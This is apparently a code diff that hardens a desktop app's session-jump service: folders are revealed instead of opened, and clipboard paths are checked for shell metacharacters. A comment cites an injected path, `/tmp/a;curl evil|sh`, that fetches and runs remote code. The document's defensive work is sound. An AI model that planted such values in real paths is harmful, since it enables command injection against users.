@@ -6,9 +6,15 @@ import type { SessionJumpAction, SessionJumpResult } from '../src/types/session-
 import { isValidBundleId, parseHostHints, resolveHostBundleId } from './host-app.ts'
 import { SlidingWindowLimiter } from './sliding-window-limiter.ts'
 
-// "Jump back" actions for one agent session: switch to its app, open its project folder or copy
-// its path. The absolute project path and bundle id arrive with authenticated hook events and are
+// "Jump back" actions for one agent session: switch to its app, show its project folder or copy
+// its path. The absolute project path and bundle id arrive with token-authenticated events and are
 // kept here, in main-process memory only; the renderer names a session by source + session id.
+//
+// Trust boundary: hook events and generic /v1/events callers share one event token, and the
+// adapter registry assigns a built-in adapter id from the `source` field alone, so a token holder
+// can pose as a hook. Nothing here relies on the event being "really" from a hook. The guarantees
+// are: only allowlisted terminal/IDE apps can ever be activated, every action needs a user click,
+// and folders are only revealed (never opened, so no app or document package is launched).
 
 const MAX_ENTRIES = 200
 /** Matches the renderer's removal horizon; an older session cannot be shown, so it cannot be targeted. */
@@ -18,7 +24,9 @@ const RATE_WINDOW_MS = 10_000
 const RATE_LIMIT_PER_ACTION = 5
 // eslint-disable-next-line no-control-regex
 const CONTROL_CHARACTERS = /[\u0000-\u001f\u007f]/
-// A macOS package directory is a launchable or loadable bundle: Finder would run it, not browse it.
+// Package directories are refused outright; the folder is only ever revealed, but there is no
+// reason to point Finder at a bundle. (Document packages such as .xcodeproj are covered by the
+// reveal-only behaviour, not by this list.)
 const MAC_PACKAGE_EXTENSIONS: ReadonlySet<string> = new Set([
   '.app', '.appex', '.action', '.bundle', '.component', '.driver', '.framework', '.kext', '.mdimporter', '.mpkg',
   '.pkg', '.plugin', '.prefpane', '.qlgenerator', '.saver', '.systemextension', '.wdgt', '.workflow', '.xpc',
@@ -50,8 +58,12 @@ export interface SessionJumpDependencies {
   getPreferences(): { sessionJumpEnabled: boolean; sessionJumpSwitchAppEnabled: boolean }
   /** Runs `/usr/bin/open -b <bundleId>`; injected so tests never launch anything. */
   activateBundle(bundleId: string): Promise<void>
-  /** shell.openPath on a verified directory; resolves to an error message or ''. */
-  openDirectory(directory: string): Promise<string>
+  /**
+   * Reveals a verified directory in the file manager (selects it in its parent). Never "opens" it:
+   * LaunchServices treats document packages (.xcodeproj, .rtfd, ...) as documents and would launch
+   * their app with attacker-chosen content.
+   */
+  revealDirectory(directory: string): void
   writeClipboard(text: string): void
   realpath(target: string): Promise<string>
   stat(target: string): Promise<DirectoryStat>
@@ -101,6 +113,17 @@ export function isUsableProjectPath(value: unknown, platform: NodeJS.Platform): 
   // UNC and device paths would make Explorer contact a remote host (and send credentials).
   if (platform === 'win32' && /^[\\/]{2}/.test(value)) return false
   return true
+}
+
+// Shell metacharacters (and quotes) that would change what an unquoted paste does. Backslash is
+// an escape in POSIX shells but the separator on Windows, where cmd's % and ^ are refused instead.
+const POSIX_SHELL_METACHARACTERS = /[;|&$`<>(){}*?!"'\\]/
+const WINDOWS_SHELL_METACHARACTERS = /[;|&$`<>(){}*?!"'%^]/
+
+/** A path that can be pasted unquoted into a shell without running anything extra. */
+export function isShellSafePath(value: string, platform: NodeJS.Platform): boolean {
+  if (CONTROL_CHARACTERS.test(value)) return false
+  return !(platform === 'win32' ? WINDOWS_SHELL_METACHARACTERS : POSIX_SHELL_METACHARACTERS).test(value)
 }
 
 /** Resolves a project path to an existing, non-bundle directory, or null. Never follows into a file. */
@@ -175,7 +198,8 @@ export class SessionJumpService {
   switchTarget(key: string): string | null {
     if (this.deps.platform !== 'darwin') return null
     const entry = this.entry(key)
-    // Generic /v1/events callers are observe-only and may not choose an app to bring forward.
+    // Defence in depth only: an explicit generic-http event is refused, but a token holder can still
+    // claim a built-in source. The allowlist in resolveHostBundleId is the real boundary.
     if (!entry || !entry.adapterId || entry.adapterId === 'generic-http') return null
     return resolveHostBundleId(entry.app, entry.bundleId)
   }
@@ -210,22 +234,23 @@ export class SessionJumpService {
           return { ok: false, error: 'failed' }
         }
       }
-      case 'open-folder': {
+      case 'show-folder': {
         const directory = await verifyProjectDirectory(entry.projectPath, this.deps)
         if (!directory) return { ok: false, error: 'unavailable' }
         try {
-          const message = await this.deps.openDirectory(directory)
-          return message ? { ok: false, error: 'failed' } : { ok: true }
+          this.deps.revealDirectory(directory)
+          return { ok: true }
         } catch {
           return { ok: false, error: 'failed' }
         }
       }
       case 'copy-path': {
-        // Same bar as opening it: only a path that is an existing, non-bundle directory right now
-        // reaches the clipboard (control characters are already refused), so a forged event cannot
-        // plant arbitrary text there. The path is copied as reported, not as resolved.
+        // The user pastes this without seeing it, often into a shell. Only a path free of shell
+        // metacharacters that is an existing, non-bundle directory right now reaches the clipboard,
+        // so a forged event cannot plant `/tmp/a;curl evil|sh`. Copied as reported, not resolved.
         const projectPath = entry.projectPath
-        if (!projectPath || !(await verifyProjectDirectory(projectPath, this.deps))) return { ok: false, error: 'unavailable' }
+        if (!projectPath || !isShellSafePath(projectPath, this.deps.platform)) return { ok: false, error: 'unavailable' }
+        if (!(await verifyProjectDirectory(projectPath, this.deps))) return { ok: false, error: 'unavailable' }
         try {
           this.deps.writeClipboard(projectPath)
           return { ok: true }
